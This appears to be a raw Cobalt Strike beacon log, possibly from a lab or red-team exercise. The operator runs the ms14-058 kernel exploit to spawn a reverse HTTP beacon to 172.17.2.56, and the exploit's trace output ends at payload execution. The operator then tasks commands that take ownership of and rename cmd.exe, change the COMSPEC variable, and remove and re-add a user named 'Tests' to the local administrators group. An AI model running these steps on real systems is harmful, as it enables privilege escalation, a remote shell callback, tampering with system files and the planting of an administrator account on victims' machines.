02/23 15:35:55 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 17396; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/23 15:44:36 [input] <neo> elevate ms14-058 test
02/23 15:44:36 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
02/23 15:44:50 [checkin] host called home, sent: 104503 bytes
02/23 15:44:51 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43816
[*] Parsing SYSTEM_INFO...
[*] 148 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c14000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F671FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F6A9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C00D8C30
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


02/23 18:22:55 [task] /c4***修改cmd名称并进行操作****
02/23 18:22:55 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/23 18:22:55 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/23 18:22:55 [task] Tasked beacon to run: ren C:\Windows\System32\cmd.exe cmd_back.exe
02/23 18:22:55 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/23 18:22:55 [task] Tasked beacon to run: Net Localgroup administrators Tests /del
02/23 18:22:55 [task] Tasked beacon to run: Net Localgroup administrators Tests /add
02/23 18:23:19 [checkin] host called home, sent: 693 bytes
02/23 18:23:30 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/23 18:23:30 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/23 18:23:30 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Rename-Item : 无法重命名，因为“C:\Windows\System32\cmd.exe”处不存在项。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 4_x000D__x000A_</S><S S="Error">+ ren &lt;&lt;&lt;&lt;  C:\Windows\System32\cmd.exe cmd_back.exe_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (:) [Rename-Item], PSInvalidOp _x000D__x000A_</S><S S="Error">   erationException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : InvalidOperation,Microsoft.PowerShell.Commands.R _x000D__x000A_</S><S S="Error">   enameItemCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/23 18:23:30 [output]
received output:

成功: 指定的值已得到保存。


02/23 18:23:30 [output]
received output:
命令成功完成。



02/23 18:23:30 [output]
received output:
命令成功完成。



02/23 18:37:14 [task] 4*******恢复cmd名称*******
02/23 18:37:14 [task] Tasked beacon to run: ren C:\Windows\System32\cmd_back.exe cmd.exe
02/23 18:37:14 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd.exe"
02/23 18:37:30 [checkin] host called home, sent: 374 bytes
02/23 18:37:32 [output]
received output:

成功: 指定的值已得到保存。


02/23 18:42:45 [task] /c4***进行用户组提升操作****
02/23 18:42:45 [task] Tasked beacon to run: Net Localgroup administrators Tests /del
02/23 18:42:45 [task] Tasked beacon to run: Net Localgroup administrators Tests /add
02/23 18:43:32 [checkin] host called home, sent: 142 bytes
02/23 18:43:33 [output]
received output:
命令成功完成。



02/23 18:43:33 [output]
received output:
命令成功完成。



02/23 18:51:14 [task] /c4***进行用户组提升操作****
02/23 18:51:14 [task] Tasked beacon to run: Net Localgroup administrators Tests /del
02/23 18:51:14 [task] Tasked beacon to run: Net Localgroup administrators Tests /add
02/23 18:51:33 [checkin] host called home, sent: 142 bytes
02/23 18:51:34 [output]
received output:
命令成功完成。



02/23 18:51:34 [output]
received output:
命令成功完成。



